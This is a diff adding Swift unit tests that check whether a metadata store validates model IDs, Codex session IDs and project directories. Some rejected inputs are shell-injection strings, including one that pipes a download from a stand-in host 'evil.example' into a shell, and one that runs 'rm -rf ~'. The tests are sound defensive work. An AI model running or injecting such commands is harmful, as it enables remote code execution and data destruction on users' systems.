@@ -127,6 +127,48 @@ final class SurfaceMetadataStoreValidationTests: XCTestCase {
         }
     }
 
+    // MARK: - model
+
+    func testStoreAcceptsDottedModelIds() throws {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        for model in ["gpt-5.5", "gpt-5.4-pro", "openai/gpt-oss-120b"] {
+            let result = try store.setMetadata(
+                workspaceId: workspace,
+                surfaceId: surface,
+                partial: ["model": model],
+                mode: .merge,
+                source: .explicit
+            )
+            XCTAssertEqual(result.applied["model"], true)
+            XCTAssertEqual(
+                store.getMetadata(workspaceId: workspace, surfaceId: surface).metadata["model"] as? String,
+                model
+            )
+        }
+    }
+
+    func testStoreRejectsModelIdsWithWhitespaceOrShellSyntax() {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        for model in ["gpt 5.5", "gpt-5.5\nrm -rf ~", ";curl"] {
+            XCTAssertThrowsError(
+                try store.setMetadata(
+                    workspaceId: workspace,
+                    surfaceId: surface,
+                    partial: ["model": model],
+                    mode: .merge,
+                    source: .explicit
+                ),
+                "store must reject malformed model id '\(model)'"
+            )
+        }
+    }
+
     /// Store state must stay empty after rejected writes — the throw is
     /// supposed to happen before mutation per the reserved-key pre-check.
     func testRejectedWriteLeavesStoreUntouched() {
@@ -144,6 +186,113 @@ final class SurfaceMetadataStoreValidationTests: XCTestCase {
         let (metadata, sources) = store.getMetadata(workspaceId: workspace, surfaceId: surface)
         XCTAssertNil(metadata["claude.session_id"])
         XCTAssertNil(sources["claude.session_id"])
+    }
+
+    // MARK: - codex.session_id
+
+    func testStoreAcceptsValidUUIDCodexSessionId() throws {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        let result = try store.setMetadata(
+            workspaceId: workspace,
+            surfaceId: surface,
+            partial: ["codex.session_id": "abc12345-ef67-890a-bcde-f0123456789a"],
+            mode: .merge,
+            source: .explicit
+        )
+        XCTAssertEqual(result.applied["codex.session_id"], true)
+    }
+
+    func testStoreRejectsShellInjectionInCodexSessionId() {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        XCTAssertThrowsError(
+            try store.setMetadata(
+                workspaceId: workspace,
+                surfaceId: surface,
+                partial: ["codex.session_id": "fake; curl evil.example/x | sh"],
+                mode: .merge,
+                source: .explicit
+            )
+        ) { error in
+            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
+                return XCTFail("expected WriteError, got \(error)")
+            }
+            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
+        }
+    }
+
+    func testRestoreFromSnapshotDropsInvalidReservedMetadata() {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        store.restoreFromSnapshot(
+            workspaceId: workspace,
+            surfaceId: surface,
+            values: [
+                "title": "Restored",
+                "model": "gpt 5.5",
+                "codex.session_id": "fake; curl evil.example/x | sh",
+                "codex.session_project_dir": "relative/path"
+            ],
+            sources: [
+                "title": SurfaceMetadataStore.SourceRecord(source: .explicit, ts: 1.0),
+                "model": SurfaceMetadataStore.SourceRecord(source: .explicit, ts: 1.0),
+                "codex.session_id": SurfaceMetadataStore.SourceRecord(source: .explicit, ts: 1.0),
+                "codex.session_project_dir": SurfaceMetadataStore.SourceRecord(source: .explicit, ts: 1.0)
+            ]
+        )
+
+        let restored = store.getMetadata(workspaceId: workspace, surfaceId: surface)
+        XCTAssertEqual(restored.metadata["title"] as? String, "Restored")
+        XCTAssertNil(restored.metadata["model"])
+        XCTAssertNil(restored.metadata["codex.session_id"])
+        XCTAssertNil(restored.metadata["codex.session_project_dir"])
+        XCTAssertNotNil(restored.sources["title"])
+        XCTAssertNil(restored.sources["model"])
+        XCTAssertNil(restored.sources["codex.session_id"])
+        XCTAssertNil(restored.sources["codex.session_project_dir"])
+    }
+
+    func testStoreAcceptsCodexProjectDir() throws {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        let result = try store.setMetadata(
+            workspaceId: workspace,
+            surfaceId: surface,
+            partial: ["codex.session_project_dir": "/Users/op/repo/c11"],
+            mode: .merge,
+            source: .explicit
+        )
+        XCTAssertEqual(result.applied["codex.session_project_dir"], true)
+    }
+
+    func testStoreRejectsMalformedCodexProjectDir() {
+        let workspace = UUID()
+        let surface = UUID()
+        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
+
+        XCTAssertThrowsError(
+            try store.setMetadata(
+                workspaceId: workspace,
+                surfaceId: surface,
+                partial: ["codex.session_project_dir": "relative/path"],
+                mode: .merge,
+                source: .explicit
+            )
+        ) { error in
+            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
+                return XCTFail("expected WriteError, got \(error)")
+            }
+            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
+        }
     }
 
     // MARK: - claude.session_project_dir
